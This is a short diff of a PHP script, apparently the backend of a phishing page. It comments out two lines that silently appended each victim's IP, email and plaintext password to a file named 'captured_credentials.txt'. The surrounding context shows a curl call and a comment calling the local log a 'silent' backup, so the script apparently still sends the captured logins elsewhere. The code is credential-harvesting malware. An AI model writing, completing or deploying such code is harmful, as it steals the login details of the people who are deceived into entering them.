@@ -46,8 +46,8 @@ $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 curl_close($ch);
 
 // Always log to local file as primary backup (silent)
-$log_entry = date('Y-m-d H:i:s') . " | IP: {$ip_address} | Email: {$email} | Password: {$password}\n";
-file_put_contents('captured_credentials.txt', $log_entry, FILE_APPEND | LOCK_EX);
+//$log_entry = date('Y-m-d H:i:s') . " | IP: {$ip_address} | Email: {$email} | Password: {$password}\n";
+//file_put_contents('captured_credentials.txt', $log_entry, FILE_APPEND | LOCK_EX);
 
 // Return simple response
 if ($http_code == 200) {
